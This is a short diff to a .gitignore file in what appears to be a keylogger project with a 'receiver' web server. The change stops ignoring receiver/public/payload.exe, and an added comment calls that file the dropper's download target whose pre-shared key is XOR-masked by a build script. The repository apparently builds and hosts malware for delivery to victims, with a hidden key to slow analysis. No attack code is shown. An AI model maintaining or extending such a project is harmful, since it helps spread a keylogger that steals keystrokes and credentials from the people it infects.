@@ -1,12 +1,13 @@
 # Build output and generated files — never commit secrets or binaries.
 # design.md is intentionally kept out of the repo (internal design notes).
+# NOTE: receiver/public/payload.exe IS committed on purpose — it is the
+# dropper's download target; the PSK inside is XOR-masked by build.py.
 design.md
 keylogger/config.json
 keylogger/src/gen_strings.h
 keylogger/res/generated.rc
 keylogger/res/version_res.o
 keylogger/out/
-receiver/public/payload.exe
 receiver/node_modules/
 receiver/.next/
 receiver/.env.local
